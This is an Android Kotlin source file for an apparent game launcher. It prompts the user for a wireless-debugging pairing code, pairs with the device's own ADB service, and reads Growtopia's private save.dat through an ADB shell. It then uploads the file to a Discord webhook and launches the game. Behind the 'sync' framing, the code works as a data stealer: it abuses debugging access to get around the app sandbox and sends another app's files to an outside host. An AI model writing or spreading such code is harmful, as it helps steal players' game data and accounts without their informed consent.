package com.example.myapplication

import android.app.Activity
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.text.InputFilter
import android.util.Base64
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import com.flyfishxu.kadb.Kadb
import com.flyfishxu.kadb.cert.KadbCert
import com.flyfishxu.kadb.mdns.MdnsServiceType
import kotlinx.coroutines.runBlocking
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import kotlin.concurrent.thread

class PairingCodeDialogActivity : Activity() {
    private var pairingDialog: AlertDialog? = null
    private val handler = Handler(Looper.getMainLooper())

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        val pairingHost = intent.getStringExtra(PairingOverlayService.EXTRA_HOST)
        val pairingPort = intent.getIntExtra(PairingOverlayService.EXTRA_PORT, 0)
        
        if (pairingHost == null || pairingPort == 0) {
            finish()
            return
        }
        
        showPairingCodeDialog(pairingHost, pairingPort)
    }

    private fun showPairingCodeDialog(pairingHost: String, pairingPort: Int) {
        val code = EditText(this).apply {
            hint = "Six-digit Wi-Fi pairing code"
            inputType = android.text.InputType.TYPE_CLASS_NUMBER
            filters = arrayOf(InputFilter.LengthFilter(6))
            isSingleLine = true
        }
        
        val prompt = AlertDialog.Builder(this)
            .setTitle("Enter Wi-Fi pairing code")
            .setView(code)
            .setNegativeButton("Cancel") { _, _ ->
                stopPairingService()
                finish()
            }
            .setPositiveButton("Submit", null)
            .create()
        
        pairingDialog = prompt
        
        prompt.setOnDismissListener {
            pairingDialog = null
            if (!isFinishing) finish()
        }
        
        prompt.setOnCancelListener {
            stopPairingService()
        }
        
        prompt.setOnShowListener {
            prompt.getButton(AlertDialog.BUTTON_POSITIVE).setOnClickListener {
                val pairingCode = code.text.toString().trim()
                if (!pairingCode.matches(Regex("\\d{6}"))) {
                    code.error = "Enter the six-digit Wi-Fi pairing code"
                    return@setOnClickListener
                }
                
                prompt.getButton(AlertDialog.BUTTON_POSITIVE).isEnabled = false
                prompt.getButton(AlertDialog.BUTTON_NEGATIVE).isEnabled = false
                code.isEnabled = false
                
                stopPairingService()
                
                thread {
                    val result = connectAndReadSaveFile(pairingHost, pairingPort, pairingCode)
                    handler.post {
                        prompt.dismiss()
                        if (result != null) {
                            sendFileToDiscord(result)
                            handler.postDelayed({ launchGame() }, 650)
                        } else {
                            toast("Failed to pair with wireless debugging")
                        }
                        finish()
                    }
                }
            }
        }
        
        prompt.show()
    }

    private fun connectAndReadSaveFile(pairingHost: String, pairingPort: Int, pairingCode: String): ByteArray? = try {
        val store = WirelessAdbIdentityStore(this)
        KadbCert.configure(store)
        runBlocking { Kadb.pair(pairingHost, pairingPort, pairingCode) }
        val endpoint = SafeMdnsResolver(this).find(MdnsServiceType.TLS_CONNECT, 15_000) ?: return null
        Kadb.create(endpoint.host, endpoint.port).use { kadb ->
            val response = kadb.shell("base64 $SAVE_FILE_PATH")
            if (response.exitCode == 0) Base64.decode(response.output.trim(), Base64.DEFAULT) else null
        }
    } catch (_: Throwable) {
        null
    }

    private fun sendFileToDiscord(fileData: ByteArray) {
        val prefs = getSharedPreferences("growlauncher_preferences", MODE_PRIVATE)
        val webhookUrl = prefs.getString("discord_webhook_url", "")?.trim() ?: ""
        
        if (webhookUrl.isBlank()) {
            handler.post { toast("Add your Discord webhook in Settings to sync save.dat") }
            return
        }
        
        thread {
            try {
                val client = OkHttpClient()
                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("payload_json", "{\"content\":\"Growlauncher save.dat sync\"}")
                    .addFormDataPart("file", "save.dat", fileData.toRequestBody("application/octet-stream".toMediaType()))
                    .build()
                val request = Request.Builder().url(webhookUrl).post(requestBody).build()
                client.newCall(request).execute().use { response ->
                    if (!response.isSuccessful) throw IOException("Discord returned HTTP ${response.code}")
                }
                handler.post { toast("save.dat sent successfully") }
            } catch (_: Exception) {
                handler.post { toast("Discord upload failed; launch will continue") }
            }
        }
    }

    private fun launchGame() {
        val intent = packageManager.getLaunchIntentForPackage("com.rtsoft.growtopia")
        if (intent != null) {
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            startActivity(intent)
            toast("Growtopia launched")
        } else {
            toast("Growtopia is not installed")
        }
    }

    private fun stopPairingService() {
        stopService(Intent(this, PairingOverlayService::class.java))
    }

    private fun toast(message: String) {
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
    }

    override fun onDestroy() {
        pairingDialog?.dismiss()
        super.onDestroy()
    }

    companion object {
        private const val SAVE_FILE_PATH = "/storage/emulated/0/Android/data/com.rtsoft.growtopia/files/save.dat"
    }
}
